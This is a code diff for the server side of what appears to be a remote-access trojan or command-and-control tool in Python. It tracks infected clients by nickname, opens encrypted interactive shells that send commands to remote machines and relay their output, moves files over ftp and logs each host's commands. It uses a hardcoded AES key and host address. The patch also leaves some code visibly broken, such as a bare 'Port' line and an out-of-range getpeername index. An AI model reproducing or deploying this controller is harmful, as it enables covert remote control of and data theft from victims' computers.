@@ -10,12 +10,12 @@ from Crypto.Util.Padding import pad,unpad
 from Crypto.Random import get_random_bytes
 
 
-Host = "192.168.140.65"
+Host = "192.168.30.52"
 Port = 6565
 test_PORT = 2121
 client_list=[]
 address_list = []
-aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
+aes_key = b'\x87\xc1\x1aYH\xcc\xd77\x12bs\x89V\xe3\x89\xdf'
 
 
 
@@ -127,11 +127,14 @@ def encrypt_data(data):
     return cipher.iv + ciphertext
 
 def decrypt_data(encrypted_data):
-    iv = encrypted_data[:AES.block_size]
-    ciphertext = encrypted_data[AES.block_size:]
-    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
-    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
-    return decrypted_data
+    try:
+        iv = encrypted_data[:AES.block_size]
+        ciphertext = encrypted_data[AES.block_size:]
+        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
+        return decrypted_data
+    except Exception as e:
+        print(e)
 
 
 
@@ -263,56 +266,74 @@ def ftp(command,client):
 def connect(NickName):
     IP = ''
     Port = ''
+    find = True
     for each in data['client_list']:
         if each['NickName'] == NickName:
+            find = False
             IP = each["IP"]
             Port = each['Port']
             HostName = each["HostName"]
-    for client in client_list : 
+    if find:
+        print(colour.info("[*] NickName not found."))
+    for client in client_list :
         raddr = client.getpeername()[0] if client else None
         rport = client.getpeername()[1] if client else None
         if raddr == IP and rport == Port:
-            print(colour.info(f"[*] Connected to {NickName} !!"))
-            history_saver(f"[*] Connected to {NickName} !!")
-            command = ''
-            enc = encrypt_data(b"connect")
-            client.send(enc)
-            while command != "close":
-                pwd = decrypt_data(client.recv(40960)).decode('utf-8')
-                while True:
-                    command = input(f"{colour.CC} {colour.NickName('<'+NickName+'>')} {colour.Path('('+pwd+')')} {colour.arrow} ");print("\033[0m", end='')
-                    log_saver(HostName,command)
-                    if command == "clear" or command == "cls":
-                        os.system('cls' if os.name == 'nt' else 'clear')
-                    elif command.split(" ")[0] == "ftp":
-                        ftp_command = command.split()
-                        if len(ftp_command) == 3:
+            try:
+                print(colour.info(f"[*] Connected to {NickName} !!"))
+                history_saver(f"[*] Connected to {NickName} !!")
+                command = ''
+                enc = encrypt_data(b"connect")
+                client.send(enc)
+                while command != "close":
+                    pwd = decrypt_data(client.recv(40960)).decode('utf-8')
+                    while True:
+                        command = input(f"{colour.CC} {colour.NickName('<'+NickName+'>')} {colour.Path('('+pwd+')')} {colour.arrow} ");print("\033[0m", end='')
+                        log_saver(HostName,command)
+                        if command == "clear" or command == "cls":
+                            os.system('cls' if os.name == 'nt' else 'clear')
+                        elif command.split(" ")[0] == "ftp":
+                            ftp_command = command.split()
+                            if len(ftp_command) == 3:
+                                enc = encrypt_data(command.encode('utf-8'))
+                                client.send(enc)
+                                ftp(ftp_command,client)
+                                output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
+                                print(output,end="")
+                                log_saver(HostName,output)
+                            else:
+                                print(colour.info("[*] Wrong command."))
+                            break
+                        elif command != "":
                             enc = encrypt_data(command.encode('utf-8'))
                             client.send(enc)
-                            ftp(ftp_command,client)
                             output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
                             print(output,end="")
                             log_saver(HostName,output)
-                        else:
-                            print(colour.info("[*] Wrong command."))
-                        break
-                    elif command != "":
-                        enc = encrypt_data(command.encode('utf-8'))
-                        client.send(enc)
-                        output = f"{decrypt_data(client.recv(4096000)).decode('utf-8')}"
-                        print(output,end="")
-                        log_saver(HostName,output)
-                        break
-
+                            break
+            except :
+                client_list.remove(client)
+                for client in data['client_list']:
+                    if client["NickName"] == NickName:
+                        history_saver(f"[*] {NickName}'s Status Changed as: False ")
+                        print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
+                        client["Status"] = "False"
+                        with open('./Data/client_list.json', 'w') as f:
+                            json.dump(data, f,indent=4)
+                print(colour.info("[*] Client droped !!!"))
 
 def nick(HostName,NickName):
+    find = True
     for client in data['client_list']:
         if client["HostName"] == HostName:
+            find = False
             history_saver(f"[*] {HostName}'s NickName Changed as: {NickName}")
             print(colour.info(f"[*] {HostName}'s NickName Changed as: {NickName}"))
             client["NickName"] = NickName
             with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
+    if find:
+        print(colour.info("[*] NickName not found."))
 
 def close():
     for f in client_list:
@@ -339,27 +360,41 @@ def lists():
 
 
 def start(NickName):
+    find = True
     for client in data['client_list']:
         if client["NickName"] == NickName:
+            find = False
             history_saver(f"[*] {NickName}'s Status Changed as: True ")
             print(colour.info(f"[*] {NickName}'s Status Changed as: True"))
             client["Status"] = "True"
             with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
+    if find:
+        print(colour.info("[*] NickName not found."))
 
 
 def stop(NickName):
+    find = True
+    IP = ""
+    Port
     for client in data['client_list']:
         if client["NickName"] == NickName:
+            find = False
             history_saver(f"[*] {NickName}'s Status Changed as: False ")
             print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
             client["Status"] = "False"
             IP = client["IP"]
+            Port = client["Port"]
             with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
+    if find:
+        print(colour.info("[*] NickName not found."))
+            
     for client in client_list : 
         raddr = client.getpeername()[0] if client else None
-        if raddr == IP :
+        rport = client.getpeername()[2] if client else None
+        
+        if raddr == IP and rport == Port:
             print(colour.info(f"[*] Connection closed: {NickName} !!"))
             history_saver(f"[*] Connection closed: {NickName} !!")
             enc = encrypt_data(b"close")
@@ -407,7 +442,7 @@ if __name__ == "__main__":
                 
             case "exit":
                 close()
-                break
+                sys.exit()
             
             case "clear":
                 os.system('cls' if os.name == 'nt' else 'clear')
